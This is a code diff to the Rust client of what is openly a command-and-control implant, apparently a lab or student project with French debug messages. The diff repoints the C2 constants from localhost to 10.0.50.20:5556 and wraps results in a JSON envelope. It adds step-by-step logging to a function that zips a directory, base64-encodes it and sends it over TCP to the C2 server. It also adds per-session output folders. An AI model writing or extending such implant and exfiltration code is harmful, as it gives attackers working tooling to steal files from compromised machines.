@@ -4,7 +4,7 @@ use serde::Serialize;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::Read;
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use tokio::io::AsyncWriteExt;
 use tokio::net::TcpStream;
@@ -14,9 +14,10 @@ use walkdir::WalkDir;
 use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
 use zip::{AesMode, CompressionMethod};
+use chrono::Local;
 
-const C2_ADDR: &str = "127.0.0.1";
-const C2_PORT: u16 = 5555;
+const C2_ADDR: &str = "10.0.50.20";
+const C2_PORT: u16 = 5556;
 
 enum _Status {
     SUCCESSFUL,
@@ -85,7 +86,11 @@ pub async fn send_directive_status(
 }
 
 pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
-    let json_str = serde_json::to_string(data)?;
+    let json = serde_json::json!({
+        "type": "result",
+        "data": data
+    });
+    let json_str = serde_json::to_string(&json)?;
     send_data_tcp(json_str.as_bytes()).await?;
     send_data_tcp(b"\n").await?;
     Ok(())
@@ -161,17 +166,37 @@ pub async fn zip_dir(folder_path: &Path) -> ZipResult<NamedTempFile> {
 }
 
 pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let file_bytes = tokio::fs::read(filepath).await?;
+    println!("[SEND] Lecture du fichier ZIP: {:?}", filepath);
+    let file_bytes = match tokio::fs::read(filepath).await {
+        Ok(bytes) => {
+            println!("[SEND] Fichier lu: {} bytes", bytes.len());
+            bytes
+        }
+        Err(e) => {
+            eprintln!("[SEND] Erreur lecture fichier: {}", e);
+            return Err(Box::new(e));
+        }
+    };
+    
+    println!("[SEND] Encodage en base64...");
+    let encoded = base64::engine::general_purpose::STANDARD.encode(&file_bytes);
+    println!("[SEND] Base64: {} caractères", encoded.len());
     
     let json = serde_json::json!({
         "type": "result",
-        "data": base64::engine::general_purpose::STANDARD.encode(&file_bytes),
+        "data": encoded,
         "filename": filepath.file_name().unwrap_or_default().to_string_lossy()
     });
     
+    println!("[SEND] Sérialisation JSON...");
     let json_str = serde_json::to_string(&json)?;
+    println!("[SEND] JSON: {} caractères", json_str.len());
+    
+    println!("[SEND] Envoi au C2 (partie 1)...");
     send_data_tcp(json_str.as_bytes()).await?;
+    println!("[SEND] Envoi au C2 (partie 2)...");
     send_data_tcp(b"\n").await?;
+    println!("[SEND] Envoyé avec succès");
     
     Ok(())
 }
@@ -204,4 +229,16 @@ pub async fn ping_c2() -> Result<(), Box<dyn std::error::Error>> {
     send_data_tcp(b"\n").await?;
     
     Ok(())
+}
+
+/// Crée la structure de dossiers: output/IP_TIMESTAMP/command_name/
+pub fn get_output_path(command_name: &str) -> PathBuf {
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
+    let session_folder = format!("127.0.0.1_{}", timestamp);
+    let output_path = PathBuf::from("output").join(&session_folder).join(command_name);
+    
+    // Crée les dossiers s'ils n'existent pas
+    let _ = std::fs::create_dir_all(&output_path);
+    
+    output_path
 }
